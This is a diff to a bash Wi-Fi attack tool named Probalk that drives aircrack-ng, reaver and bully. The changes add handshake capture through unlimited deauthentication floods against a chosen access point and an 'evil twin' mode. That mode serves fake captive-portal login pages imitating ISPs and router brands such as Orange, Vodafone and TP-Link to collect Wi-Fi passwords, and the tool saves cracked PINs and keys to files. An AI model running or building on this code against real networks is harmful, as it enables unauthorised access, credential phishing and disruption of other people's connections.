@@ -9,7 +9,7 @@ if [ -e /tmp/probalk ]; then
 rm -rf  /tmp/probalk
 fi
 chmod 7777 include
-sleep 2
+scriptpath=`pwd`
 mkdir /tmp/probalk/
 
 cp include/win36l.zip  /tmp/probalk
@@ -20,7 +20,8 @@ cd /tmp/probalk
 chmod 7777 *
 handshake=no
 hiddens=no
-
+mkdir ~/Desktop/Pobalk-crack-result 2&> /dev/null
+resultpath=~/Desktop/Pobalk-crack-result 
 ##define colors
 # Bold-text+colors
 BBlack='\e[1;30m'       # Black
@@ -43,7 +44,7 @@ Purple='\e[0;35m'       # Purple
 Cyan='\e[0;36m'         # Cyan
 White='\e[0;37m'        # White
 #               animation
-blink=`echo -e "\033[5;31;40m(NEW) \033[0m\033[31;40m (can take long time \033[0m"`
+blink=`echo -e "\033[5;31;40m(NEW) \033[0m\033[31;40m (can take long time) \033[0m"`
 
 center1 (){
 termwidth="$(tput cols)"
@@ -88,9 +89,29 @@ iwconfig $nameintc mode managed  2>/dev/null
 ifconfig $nameintc up 2>/dev/null
 rfkill unblock all 2>/dev/null
 iw $nameintc del 2&> /dev/null
+cd "$scriptpath"
+rm -rf downgrade/lighttpd.conf
+rm -rf downgrade/hostapd.conf
+rm -rf downgrade/dnsmasq.conf
+rm -rf downgrade/php.socket-*
+rm -rf downgrade/lighttpd.log
+rm -rf downgrade/server/*
+rm -rf downgrade/dnsmasq.conf
+rm -rf downgrade/paramet*.txt
+rm -rf downgrade/cert.pem
+rm -rf downgrade/blacklist
+rm -rf downgrade/debug
+rm -rf downgrade/PASSWORD-OF-$bssid.txt
+rm -rf downgrade/handshake$bssid-01.cap
+
+
+
+
+
 echo -e "$BPurple -Starting Network Manager...."
 service network-manager start 2&> /dev/null
 killall xterm 2&> /dev/null
+
 }
 #########################################################################################################
 clear && sleep 0.2
@@ -187,10 +208,39 @@ else
 	echo -e "$BGreen OK"
 fi
 
+
+
+echo -ne "[+]Hostapd............."
+if ! hash hostapd 2>/dev/null; then
+	echo -e "$BRed Package Not Installed"
+	exit=1
+else
+	echo -e "$BGreen OK"
+fi
+
+
+echo -ne "[+]lighttpd............."
+if ! hash lighttpd 2>/dev/null; then
+	echo -e "$BRed Package Not Installed"
+	exit=1
+else
+	echo -e "$BGreen OK"
+fi
+
+
+echo -ne "[+]dnsmasq............."
+if ! hash dnsmasq 2>/dev/null; then
+	echo -e "$BRed Package Not Installed"
+	exit=1
+else
+	echo -e "$BGreen OK"
+fi
+
+
 ###################
 scanheart(){
 cd /tmp/probalk
-xterm  -geometry "150x100+400+0" -bg "#1d2951" -fg "#d1e231"  -title "Scanning For Networks ... " -e "airodump-ng  -w tempsoyalk  --output-format csv --encrypt WPA --wps --uptime  --manufacturer    --ignore-negative-one $nameintc"
+xterm  -geometry "140x40+200+0"  -bg "#1d2951" -fg "#d1e231"  -title "Scanning For Networks ... " -e "airodump-ng  -w tempsoyalk  --output-format csv --encrypt WPA --wps --uptime  --manufacturer    --ignore-negative-one $nameintc"
 }
 ########
 printscan(){
@@ -201,6 +251,7 @@ filecsv=tempsoyalk-01.csv
 
 nmb=`sed -n '/BSSID/,/Station MAC/p' $filecsv | wc -l`
 declare nmbreal
+backnm="$nmb"
 nmbreal=$((nmb-1))
 echo -e "    $Blue      BSSID           # CHANNEL     POWER(%)  ENCREPTION      ESSID "
 for i in $(seq 3  $nmbreal)
@@ -223,8 +274,14 @@ done
 tt=$(($(($nmbreal))-2))
 
 y3=0
+
+echo -e $BCyan "$backnm ) BACK $BGreen"
 while [ $y3 = 0 ] ; do
-	read -p "Choose The Network You Want To Use:" option3
+	read -p "[+] Choose The Network You Want To Use:" option3
+	if [ "$option3" == "$backnm"  ];then
+	  mainpage
+	  break
+	fi
 	case $option in 
 	[1-400])
 
@@ -251,6 +308,7 @@ while [ $y3 = 0 ] ; do
 
 
 done
+
 option3=$option3+1
 bssid=`awk -F, 'NR == '$option3+1' {print $1 }' $filecsv `
 essid=`awk -F, 'NR == '$option3+1' {print $14 }' $filecsv `
@@ -262,7 +320,9 @@ mainpage
 
 }
 ###########
-
+pausef(){
+read -p "$*"
+}
 printselected(){
 
 if [ "$bssid" ]; then
@@ -278,7 +338,7 @@ else
 fi
 
 if [ "$nameintc" ]; then
-		
+	
 	choise "{Interface Selected}"
 	echo -e "$Green Interface  => $BGreen: $nameintc"
 
@@ -287,9 +347,28 @@ else
 	echo "Interface : Not selected Yet"
 		
 fi
+if [ -f "$handshakep" ]; then
+
+	if   aircrack-ng handshake$bssid-01.cap | grep -q "1 handshake"  ; then
+		handshake="yes"
+		else
+		rm -rf "$handshakep"
+		handshake="no"
+	fi      
+#	
+
+#
+	#verify=`cowpatty -c -r "$handshakep" |grep crack|awk '{print $7}'` >/dev/null 2>/dev/null
+	#
+	 #    if [ "$verify" !=  "crack" ] ; then
+	  #    rm -rf "$handshakep"
+	   #   handshake="no"
+	    
+fi
 if [ "$handshake" == "yes" ] ; then
+	
 		choise "{Handshake}"		
-	echo -e $Green "status : captured "handshake-01.cap" "
+	echo -e $Green "status : captured "$handshakep" "
 	
 	choise ""
 else
@@ -298,12 +377,8 @@ else
 	choise ""
 		
 fi
-
-
 }
-pausef(){
-read -p "$*"
-}
+
 
 
 ##################function####enable-monitor-mode
@@ -322,7 +397,7 @@ if [ "$intn" -gt "0" ]; then
 		        line1=$wirelessifaces		
 			echo -e "$Yellow 1) $line1" 
 			choise "Auto Selected"
-			echo  "ONE Interface Detect .Will Be Auto Selected"
+			echo  "ONE Interface Detected .Will Be Auto Selected"
 			intface=`echo ${wirelessifaces[0]} | awk '{print $1 }'`
 			monface=`echo $intface`
                 else
@@ -389,14 +464,14 @@ printscan
 }
 
 exel(){
-unzip  /tmp/probalk/win36l.zip -d   ~/Desktop
+unzip  /tmp/probalk/win36l.zip -d  $resultpath
 sleep 3
 mainpage
 
 }
 exeh(){
 
-unzip  /tmp/probalk/win36h.zip  -d ~/Desktop
+unzip  /tmp/probalk/win36h.zip  -d $resultpath
 sleep 3
 mainpage
 }
@@ -445,14 +520,14 @@ fi
 pin=`cat /tmp/probalk/pixiewpsreaver.txt  | grep "WPS pin:"|cut -d : -f2`  
 pin=`echo $pin`
 if [ "$pin" != "" ] ; then
-	echo "Passwords & pin cracked by probalk" > ~/Desktop/probalk_passwords.txt
-	echo "{+}essid=$essid" >> ~/Desktop/probalk_passwords.txt
-	echo "{+}bssid=$bssid" >> ~/Desktop/probalk_passwords.txt
-	echo "{+}Pin=$pin" >> ~/Desktop/probalk_passwords.txt
+	echo "Passwords & pin cracked by probalk" > $resultpath/probalk_passwords.txt
+	echo "{+}essid=$essid" >> $resultpath/probalk_passwords.txt
+	echo "{+}bssid=$bssid" >> $resultpath/probalk_passwords.txt
+	echo "{+}Pin=$pin" >> $resultpath/probalk_passwords.txt
 	echo -e "$Red Pin $Green Found $Cyan:$pin"
 	echo "[+] Running reaver with the current pin ..."
 	reaver -i $nameintc "$hdn" -b $bssid  -c $ch  -p $pin  2>&1 | tee /tmp/probalk/pixiewps.txt
-	cat /tmp/probalk/pixiewps.txt | grep "WPA PSK:" >> ~/Desktop/probalk_passwords.txt
+	cat /tmp/probalk/pixiewps.txt | grep "WPA PSK:" >> $resultpath/probalk_passwords.txt
 	echo -e "$BGreen"
 	pausef 'press any key to continue ....'
 
@@ -481,9 +556,9 @@ pixiewpsbully(){
 	trap wpsmainpage SIGINT SIGTERM SIGHUP
 if [ "$hiddens" == "no" ] ; then	
 
-	 xterm -hold -geometry "150x50+400+0" -bg "#1d2951" -fg "#d1e231" -ls -title "Pixie Dust Attack Using Bully"  -e "bully   -b $bssid  -c $ch $nameintc -d -v 4   2>&1 | tee ~/Desktop/probalk_pins-passwords_bully.txt"
+	 xterm -hold -geometry "150x50+400+0" -bg "#1d2951" -fg "#d1e231" -ls -title "Pixie Dust Attack Using Bully"  -e "bully   -b $bssid  -c $ch $nameintc -d -v 4   2>&1 | tee $resultpath/probalk_pins-passwords_bully.txt"
 else
-	 xterm -hold -geometry "150x50+400+0" -bg "#1d2951" -fg "#d1e231" -ls -title "Pixie Dust Attack Using Bully"  -e "bully  -e $essid -b $bssid  -c $ch $nameintc -d -v 4   2>&1 | tee ~/Desktop/probalk_pins-passwords_bully.txt "
+	 xterm -hold -geometry "150x50+400+0" -bg "#1d2951" -fg "#d1e231" -ls -title "Pixie Dust Attack Using Bully"  -e "bully  -e $essid -b $bssid  -c $ch $nameintc -d -v 4   2>&1 | tee $resultpath/probalk_pins-passwords_bully.txt "
 
 
 fi
@@ -509,10 +584,10 @@ bruteforcepinbully(){
 	iwconfig $nameintc channel $ch
 	trap wpsmainpage SIGINT SIGTERM SIGHUP
 if [ "$hiddens" == "no" ] ; then		
-	xterm -hold -geometry "150x50+400+0" -bg "#1d2951" -fg "#d1e231"  -title "Brute-Force Pin Using bully "  -e "bully   -b $bssid  -c $ch -B -F $nameintc -o  ~/Desktop/bully.pin.probalk.txt"
+	xterm -hold -geometry "150x50+400+0" -bg "#1d2951" -fg "#d1e231"  -title "Brute-Force Pin Using bully "  -e "bully   -b $bssid  -c $ch -B -F $nameintc -o  $resultpath/bully.pin.probalk.txt"
 
 else
-	xterm -hold -geometry "150x50+400+0" -bg "#1d2951" -fg "#d1e231"  -title "Brute-Force Pin Using bully "  -e "bully   -e $essid  -c $ch -B -F $nameintc -o  ~/Desktop/bully.pin.probalk.txt"
+	xterm -hold -geometry "150x50+400+0" -bg "#1d2951" -fg "#d1e231"  -title "Brute-Force Pin Using bully "  -e "bully   -e $essid  -c $ch -B -F $nameintc -o  $resultpath/bully.pin.probalk.txt"
 
 
 fi
@@ -532,9 +607,9 @@ cutompinbully(){
 	trap wpsmainpage SIGINT SIGTERM SIGHUP
 	read -p "Enter The Pin You Want To Crack :" $pin
 if [ "$hiddens" == "no" ] ; then		
-	xterm -hold -geometry "150x50+400+0" -bg "#1d2951" -fg "#d1e231"  -title "Crack Custom Pin With Reaver "  -e "bully   -b $bssid -e $essid -c $ch -p $pin -F $nameintc -o  ~/Desktop/bully.pin.probalk.txt"
+	xterm -hold -geometry "150x50+400+0" -bg "#1d2951" -fg "#d1e231"  -title "Crack Custom Pin With Reaver "  -e "bully   -b $bssid -e $essid -c $ch -p $pin -F $nameintc -o  $resultpath/bully.pin.probalk.txt"
 else
-	xterm -hold -geometry "150x50+400+0" -bg "#1d2951" -fg "#d1e231"  -title "Crack Custom Pin With Reaver "  -e "bully    -e $essid -c $ch -p $pin -F $nameintc -o  ~/Desktop/bully.pin.probalk.txt"
+	xterm -hold -geometry "150x50+400+0" -bg "#1d2951" -fg "#d1e231"  -title "Crack Custom Pin With Reaver "  -e "bully    -e $essid -c $ch -p $pin -F $nameintc -o  $resultpath/bully.pin.probalk.txt"
 
 
 fi
@@ -586,11 +661,12 @@ done
 
 
 heartwithout(){
-	trap mainpage SIGINT SIGTERM SIGHUP	
+	trap mainpage SIGINT SIGTERM SIGHUP
+	echo -e $BYellow
 	if [ "$handshake" == "yes" ] ; then
 		read -p "handshake already captured would you like to use it (y/n) :" handopt
 		if [ "$handopt" == "y" ] ; then 
-			handshakep=handshake-01.cap
+			handshakep=handshake$bssid-01.cap
 		else
 
 		read -p "Enter The handshake path:" handshakep
@@ -599,7 +675,7 @@ heartwithout(){
 				read -p "Enter The handshake path:" handshakep
 	fi
 		
-	pwdpath=~/Desktop/PASSWORD-OF-WIFI-CRACKED.txt
+	pwdpath=$resultpath/PASSWORD-OF-WIFI-CRACKED.txt
 
 	iwconfig $nameintc channel $ch
 	xterm -hold -geometry "100x60+0+0" -bg "#1d2951" -fg "#d1e231"  -title "Heart-Bleed-Probes  " -e "airodump-ng -w tmp  --output-format netxml $nameintc -c $ch" & pid5=$!
@@ -625,7 +701,7 @@ heartwithout(){
 loopai(){
 r=0
 while  [ $r = 0 ] ; do
-	xterm -hold -geometry "70x30+300+0" -bg "#1d2951" -fg "#d1e231"  -title "Heart-Bleed-Probes Aircrack-ng " -e "aircrack-ng  -a2 -b $bssid -w tmp.txt $handshakep -l ~/Desktop/PASSWORD-OF-WIFI-CRACKED.txt" & pid9=$!
+	xterm -hold -geometry "70x30+300+0" -bg "#1d2951" -fg "#d1e231"  -title "Heart-Bleed-Probes Aircrack-ng " -e "aircrack-ng  -a2 -b $bssid -w tmp.txt $handshakep -l $resultpath/PASSWORD-OF-WIFI-CRACKED.txt" & pid9=$!
 	PID_9=" $pid9";
 	sleepandkil  & pid10=$!
 	PID_10=" $pid10";	
@@ -647,7 +723,7 @@ trap mainpage SIGINT SIGTERM SIGHUP
 	if [ "$handshake" == "yes" ] ; then
 		read -p "handshake already captured would you like to use it (y/n) :" handopt
 		if [ "$handopt" == "y" ] ; then 
-			handshakep=handshake-01.cap
+			handshakep=handshake$bssid-01.cap
 		else
 
 		read -p "Enter the handshake path :" handshakep
@@ -656,7 +732,7 @@ trap mainpage SIGINT SIGTERM SIGHUP
 			read -p "Enter The handshake path:" handshakep
 	fi
 		
-	pwdpath=~/Desktop/PASSWORD-OF-WIFI-CRACKED.txt
+	pwdpath=$resultpath/PASSWORD-OF-WIFI-CRACKED.txt
 
 	iwconfig $nameintc channel $ch
 	echo $bssid>blacklist.txt
@@ -714,31 +790,100 @@ virefyhand(){
 me=0
 while  [ $me = 0 ] ; do
 	me=0	
-	verify=`cowpatty -c -r handshake-01.cap |grep crack|awk '{print $7}'`  
+	sleep 6
+	clear
+	echo -e  $BCyan "[+] Verifing handshake with cowpatty  "
+	cowpatty -c -r handshake$bssid-01.cap
+	verify=`cowpatty -c -r handshake$bssid-01.cap |grep crack|awk '{print $7}'` 
+	echo -e  $BCyan "[+]  reverifying ........"
 	if [ "$verify" == "crack" ] ; then
 	kill $PID_30 
 	kill $PID_176
 	killall xterm
+	handhsake=yes
 	
 	me=1
-		
+	break	
 	fi
 done
 }
-
-handcapture(){
-defstartsoyalk
+virefyhandair(){
+me=0
+while  [ $me = 0 ] ; do
+	me=0	
+	sleep 6
+	clear
+	echo -e  $BCyan "[+] Verifing handshake with aircrack-ng   "
+	echo -e  $BCyan "[+]  reverifying ........"
+	if  	aircrack-ng handshake$bssid-01.cap | grep -q "1 handshake"  ; then
+	kill $PID_30 
+	kill $PID_176
+	killall xterm
+	handhsake=yes
+	
+	me=1
+	break	
+	fi
+done
+}
+cowpattyverifiction() {
 trap mainpage SIGINT 2>/dev/null
 		iwconfig $nameintc channel $ch
-	xterm -hold -geometry "110x60+4000+0" -bg "#1d2951" -fg "#d1e231"  -title "capturing handshake " -e "airodump-ng -w handshake  --output-format cap $nameintc --bssid $bssid -c $ch" & pid30=$!
+	xterm -hold -geometry "110x60+4000+0" -bg "#1d2951" -fg "#d1e231"  -title "capturing handshake " -e "airodump-ng -w handshake$bssid  --output-format cap $nameintc --bssid $bssid -c $ch" & pid30=$!
 	PID_30=" $pid30";
-	virefyhand 2&> /dev/null & pid31=$!
+	virefyhand  & pid31=$!
 	PID_31=" $pid31";
 	xterm -hold -geometry "60x30+0+0" -bg "#1d2951" -fg "#d1e231"  -title "Sending Deathifications Frames To The Boardcast" -e "aireplay-ng --deauth  999999999 -a $bssid $nameintc" & pid176=$!
 	PID_176=" $pid176";
 	wait $PID_30 $PID_31 $PID_176
 	handshake=yes
+sleep 1
+	cp -rf handshake$bssid-01.cap $resultpath/handshake_of_$bssid.cap
 }
+aircrackverification() {
+trap mainpage SIGINT 2>/dev/null
+		iwconfig $nameintc channel $ch
+	xterm -hold -geometry "110x60+4000+0" -bg "#1d2951" -fg "#d1e231"  -title "capturing handshake " -e "airodump-ng -w handshake$bssid  --output-format cap $nameintc --bssid $bssid -c $ch" & pid30=$!
+	PID_30=" $pid30";
+	virefyhandair  & pid31=$!
+	PID_31=" $pid31";
+	xterm -hold -geometry "60x30+0+0" -bg "#1d2951" -fg "#d1e231"  -title "Sending Deathifications Frames To The Boardcast" -e "aireplay-ng --deauth  999999999 -a $bssid $nameintc" & pid176=$!
+	PID_176=" $pid176";
+	wait $PID_30 $PID_31 $PID_176
+	handshake=yes
+sleep 1
+	cp -rf handshake$bssid-01.cap $resultpath/handshake_of_$bssid.cap
+}
+handcapture(){
+defstartsoyalk
+
+echo -e  "$BRed [*]$BCyan Choose The $BRed Verification $BCyan Type "
+choise "{Probalk}"
+echo -e $BCyan " 1) Verify with aircrack-ng "
+choise "{Probalk}"
+echo -e $BCyan " 2) Verify with cowpatty $Yellow"
+choise "{Probalk}"
+read -p "[*]Choose The Verification Type:" verificationt
+a=0
+while [ $a = 0 ]   
+do
+      case "$verificationt" in
+	1)
+	aircrackverification
+	a=1
+	;;
+	2)
+	cowpattyverifiction
+	a=1
+	;;
+	*)
+	a=0	
+	echo "Invalide choise .."
+	;;
+      esac
+done
+}
+
 
 randmac(){
 
@@ -827,7 +972,7 @@ sleepandkil2(){
 loopaiwep(){
 w=0
 while  [ $w = 0 ] ; do
-	xterm -hold -geometry "70x30+300+0" -bg "#000000" -fg "#20C20E"   -title " Aircrack-ng " -e "aircrack-ng -b $mssid  wephand-01.cap -l ~/Desktop/PASSWORD-OF-WIFI-CRACKED-evilTWIN.txt" & pid9=$!
+	xterm -hold -geometry "70x30+300+0" -bg "#000000" -fg "#20C20E"   -title " Aircrack-ng " -e "aircrack-ng -b $mssid  wephand-01.cap -l $resultpath/PASSWORD-OF-WIFI-CRACKED-evilTWIN.txt" & pid9=$!
 	PID_9=" $pid9";
 	sleepandkil2  & pid10=$!
 	PID_10=" $pid10";	
@@ -897,7 +1042,7 @@ APmac=`echo $bssid |cut -d: -f 1,2,3,4,5 `  2>/dev/null
 mssid=`echo "$APmac:AA"` 2>/dev/null
 mssid=`echo $mssid` 2>/dev/null
 echo $bssid>blacklist2
-pwdpath="~/Desktop/PASSWORD-OF-WIFI-CRACKED-evilTWIN.txt"
+pwdpath="$resultpath/PASSWORD-OF-WIFI-CRACKED-evilTWIN.txt"
 
 xterm -hold -geometry "116x24+900+0" -bg "#000000" -fg "#20C20E"  -title "airodump-ng (capturing IVS)" -e " airodump-ng -c $ch -d $mssid  -w wephand --output-format cap $nameintc  --uptime --manufacturer  " & pid76=$!
 	PID_76=" $pid76";
@@ -925,8 +1070,8 @@ cleanup
 echo -e "$BPurple -Cleaning Up All Temporary Files Created By This Script....Hope All Processes Are Killed"
 echo -e "$BCyan -This Script Was Created By SOYALK From morocco.To Demonstrate How Can Hackers Do To Get In Your Network Hope You Enjoy It."
 echo -e "$BYelow -You can Suggest Some Features To Be Added Next Version EMAIL: likramabderrahman@gmail.com"
-echo -e "$BCyan Support US By Donate $GGreen :[+] https://www.paypal.me/Likram [+]  $BCyan Small Donate Help Us To improve Our Prpjects  "
-echo -e "$BYelow website : [*] https://www.soyalk.tk [*] "
+echo -e "$BCyan Support US By Donate $GGreen :[+] https://soyalk.com/donate/ [+]  $BCyan Small Donate Help Us To improve Our Prpjects  "
+echo -e "$BYelow website : [*] https://www.soyalk.com [*] "
 center3 " SEE YOU (;"
 choise "{Probalk}"
 
@@ -966,8 +1111,10 @@ echo -e  "$BCyan 6)Capture Handshake With Airodump-ng (Deauth attack with airepl
 choise "{Probalk}"
 echo -e  "$BCyan 7)Boost your Wifi Adapter By Incrising Tx-Power " && sleep 0.1
 choise "{Probalk}"
-echo -e  "$BCyan 8)Encrypted Evil Twin With WEP ( Caffe-Latte attack + aircrack-ng )[ Will Be Improved Next Version ]$blink" && sleep 0.1
+echo -e  "$BCyan 8)Advenced Evil Twin Aattacks ( EAP / WPA2 / WEP DOWNGRADE) $blink" && sleep 0.1
 choise "{Probalk}"
+##echo -e  "$BCyan 9)Crack WPA2/WPA Handshake (offline attacks aircrack-ng / crunch )" && sleep 0.1
+##choise "{Probalk}"
 echo -e  "$BCyan 9)Disable Monitor Mode and $BRed EXIT" && sleep 0.1
 
 }
@@ -1036,6 +1183,284 @@ echo -e  "$BCyan 11) Disable Monitor Mode and $BRed EXIT" && sleep 0.1
 }
 
 
+eviltwinopen(){
+defstartsoyalk
+if [ "$handshake" == "yes" ] ; then
+		read -p "handshake already captured would you like to use it (y/n) :" handopt
+		if [ "$handopt" == "n" ] ; then 
+		read -p "Enter The handshake path:" handshakep
+		else
+		handshakep="/tmp/probalk/handshake$bssid-01.cap"
+
+		fi
+	else 
+				read -p "Enter The handshake path:" handshakep
+	fi
+
+defstartsoyalk
+choise "{Probalk}"
+echo -e  "$BCyan 1) With SSL certificate " && sleep 0.1
+choise "{Probalk}"
+echo -e  "$BCyan 2) Without SSL certificate" && sleep 0.1
+choise "{Probalk}"
+echo -e  "$BCyan 3)Back " && sleep 0.1
+choise "{Probalk}"
+echo -e "$BRed NOTE: $Green To Redirrect https Without Borowser Warning  You need to use a certificate verificated by certificate authority CA"
+
+printselected
+b=0
+
+while [ $b = 0 ]   
+do
+      read -p "Choose one option  :" option 
+      case "$option" in
+	1)
+	ssl=1
+	b=1
+	;;
+	2)
+	ssl=0
+	b=1
+	;;
+	3)
+	ssl=0
+	b=1
+	mainpage
+	;;
+	*)
+	b=0	
+	echo "Invalide choise ..."
+	;;
+      esac
+done
+clear
+defstartsoyalk
+choise "{Probalk}"
+echo -e "$BCyan 1)   ARABIC " && sleep 0.1
+echo -e "$BCyan 2)   ENGLISH " && sleep 0.1
+echo -e "$BCyan 3)   FRENCH " && sleep 0.1
+echo -e "$BCyan 4)   SPANISH " && sleep 0.1
+echo -e "$BCyan 5)   NETWORK MANGER CONNECT SENARIO (EN) " && sleep 0.1
+echo -e "$BCyan 6)   Djaweb              [FR]" && sleep 0.1
+echo -e "$BCyan 7)   Dlink               [FR]" && sleep 0.1
+echo -e "$BCyan 8)   HG532e              [FR]" && sleep 0.1
+echo -e "$BCyan 9)   IAM                 [FR]" && sleep 0.1
+echo -e "$BCyan 10)  Movistar            [ENG]" && sleep 0.1
+echo -e "$BCyan 11)  Technicolor-TD5130  [FR]" && sleep 0.1
+echo -e "$BCyan 12)  TECHNICOLOR-UPD     [FR]" && sleep 0.1
+echo -e "$BCyan 13)  Technicolor-V2      [FR]" && sleep 0.1
+echo -e "$BCyan 14)  Technicolor-V3      [FR]" && sleep 0.1
+echo -e "$BCyan 15)  THOMSON             [FR]" && sleep 0.1
+echo -e "$BCyan 16)  Tp-LINK             [FR]" && sleep 0.1
+echo -e "$BCyan 17)  TPLINK2015          [FR]" && sleep 0.1
+echo -e "$BCyan 18)  TPLINK2020          [FR]" && sleep 0.1
+echo -e "$BCyan 19)  VODAFONE            [FR]" && sleep 0.1
+echo -e "$BCyan 20)  ZTE                 [FR]" && sleep 0.1
+echo -e "$BCyan 21)  FAST3304-V2         [FR]" && sleep 0.1
+echo -e "$BCyan 22)  INWI                [FR] isp" && sleep 0.1
+echo -e "$BCyan 23)  Orange              [FR] isp" && sleep 0.1
+
+
+echo -e  "$BCyan 24)Back " && sleep 0.1
+
+printselected
+chmod 7777 "$scriptpath/languages"
+rm -rf "$scriptpath/downgrade/server/*"
+y=0
+while [ $y = 0 ]   
+do
+      read -p "Choose one option  :" option 
+      case "$option" in
+	1)
+	lang=arabic
+	y=1
+	;;
+	2)
+	lang=english
+	y=1
+	;;
+	3)
+	lang=french
+	y=1
+	;;
+	4)
+	lang=spanish
+	y=1
+	;;
+	5)
+	cp -rf "$scriptpath/pages/networkmanagerpage/." "$scriptpath/downgrade/server/"
+  
+	y=1
+	;;
+	6)
+	cp -rf "$scriptpath/pages/Djaweb/." "$scriptpath/downgrade/server/"
+	y=1
+	;;
+	7)
+	cp -rf "$scriptpath/pages/Dlink/." "$scriptpath/downgrade/server/"
+	y=1
+	;;
+	8)
+	cp -rf "$scriptpath/pages/HG532e/." "$scriptpath/downgrade/server/"
+	
+	y=1
+	;;
+	9)
+	cp -rf "$scriptpath/pages/IAM/." "$scriptpath/downgrade/server/"
+	y=1
+	;;
+	10)	
+	cp -rf "$scriptpath/pages/Movistar/." "$scriptpath/downgrade/server/"
+	
+	y=1
+	;;
+	11)
+	cp -rf "$scriptpath/pages/Technicolor-TD5130/." "$scriptpath/downgrade/server/"
+	y=1
+	;;
+	12)
+	cp -rf "$scriptpath/pages/TECHNICOLOR-UPD/." "$scriptpath/downgrade/server/"
+	y=1
+	;;
+	13)
+	cp -rf "$scriptpath/pages/Technicolor-V2/." "$scriptpath/downgrade/server/"
+	y=1
+	;;
+	14)
+	cp -rf "$scriptpath/pages/Technicolor-V3/." "$scriptpath/downgrade/server/"
+
+	y=1
+	;;
+	15)
+	cp -rf "$scriptpath/pages/THOMSON/." "$scriptpath/downgrade/server/"
+	y=1
+	;;
+	16)
+	cp -rf "$scriptpath/pages/Tp-LINK/." "$scriptpath/downgrade/server/"
+	y=1
+	;;
+	17)
+	cp -rf "$scriptpath/pages/TPLINK2015/." "$scriptpath/downgrade/server/"	
+	y=1
+	;;
+
+	18)
+	cp -rf "$scriptpath/pages/TPLINK2020/." "$scriptpath/downgrade/server/"	
+	y=1
+	;;
+	19)
+	cp -rf "$scriptpath/pages/VODAFONE/." "$scriptpath/downgrade/server/"	
+	y=1
+	;;
+	20)
+	cp -rf "$scriptpath/pages/ZTE/." "$scriptpath/downgrade/server/"	
+	y=1
+	;;
+	21)
+	cp -rf "$scriptpath/pages/FAST3304-V2/." "$scriptpath/downgrade/server/"	
+	y=1
+	;;
+	22)
+	cp -rf "$scriptpath/pages/INWI/." "$scriptpath/downgrade/server/"	
+	y=1
+	;;
+	23)
+	cp -rf "$scriptpath/pages/Orange/." "$scriptpath/downgrade/server/"	
+	y=1
+	;;
+	24)
+	mainpage
+	y=1
+	;;
+	*)
+	y=0	
+	echo "Invalide choise ..."
+	;;
+      esac
+
+
+
+
+done
+if [ -z "$lang" ] ;
+then
+echo "not default" 
+else
+languagefile=`echo "$scriptpath/languages/$lang.txt"`
+cp -rf "$languagefile" "$scriptpath/downgrade/server/language.txt"
+cp -rf "$scriptpath/pages/default/." "$scriptpath/downgrade/server/"
+fi
+chmod 7777 "$scriptpath/downgrade/server"
+chmod 7777 "$scriptpath/downgrade"
+chmod 7777 "$scriptpath/downgrade/server/*"
+echo "$essid" > "$scriptpath/downgrade/paramet.txt"
+echo "$bssid" >> "$scriptpath/downgrade/paramet.txt"
+echo "$ch" >> "$scriptpath/downgrade/paramet.txt"
+echo "$nameintc" >> "$scriptpath/downgrade/paramet.txt"
+echo "$ssl" >> "$scriptpath/downgrade/paramet.txt"
+echo "$scriptpath" >> "$scriptpath/downgrade/paramet.txt"
+chmod 7777 "$scriptpath/downgrade"
+echo "$handshakep" >> "$scriptpath/downgrade/paramet.txt"
+echo "$resultpath" >> "$scriptpath/downgrade/paramet.txt"
+cd "$scriptpath/downgrade/"
+cp -rf "$scriptpath/include/eviltwin.sh" "$scriptpath/downgrade/eviltwin.sh"
+cp -rf "$scriptpath/include/oui.txt" "$scriptpath/downgrade/oui.txt"
+
+xterm -hold -geometry "140x40+200+0"  -bg "#ff0000" -fg "#30b21a" -title "probalkEvil Twin MAIN" -e bash "$scriptpath/downgrade/eviltwin.sh" 
+cd "/tmp/probalk/"
+killall hostapd
+killall lightttpd
+
+
+pausef "press any key to continue ....."
+
+}
+
+
+twinmainpage(){
+defstartsoyalk
+choise "{Probalk}"
+echo -e  "$BCyan 1) Evil Twin Attack (classical) " && sleep 0.1
+choise "{Probalk}"
+echo -e  "$BCyan 2) WEP Downgrade $Red (not complited yet works against windows os) " && sleep 0.1
+choise "{Probalk}"
+echo -e  "$BCyan 3)Back " && sleep 0.1
+
+printselected
+
+
+t=0
+
+while [ $t = 0 ]   
+do
+      read -p "Choose one option  :" option 
+      case "$option" in
+      1) 
+      eviltwinopen
+	cd /tmp/probalk/
+      t=1
+      ;;
+
+      2) 
+      evil_twin_wep
+      t=1
+      ;;
+      3) 
+      mainpage
+      t=1
+      ;;
+
+      *) 
+      echo "invalide choise"
+      sleep 2
+      t=0
+	twinmainpage
+      ;;
+      esac
+done
+   
+}
+
 ###
 ifinput(){
 
@@ -1086,8 +1511,8 @@ do
       x=1
       ;;
       8) 
-      evil_twin_wep
-mainpage
+     twinmainpage
+      mainpage
       x=1
       ;;
 
@@ -1180,6 +1605,7 @@ do
       esac
 done   
 }
+
 wpsmainpage(){
 trap control_c SIGINT SIGTERM SIGHUP
 defstartsoyalk
@@ -1189,14 +1615,17 @@ ifinputwps
 }
 mainpage(){
 trap control_c SIGINT SIGTERM SIGHUP
+killall airedump-ng mdk3 aireplay-ng hostapd  2>/dev/null
 sleep 0.1
 defstartsoyalk
 sleep 0.05
 choises
 printselected
+cd /tmp/probalk/ 2>/dev/null
 rm -rf $filecsv 2>/dev/null
+
 ifinput
 }
 mainpage
-#############################	echo "[+] Running reaver with the pin :$pin"
+######################
 
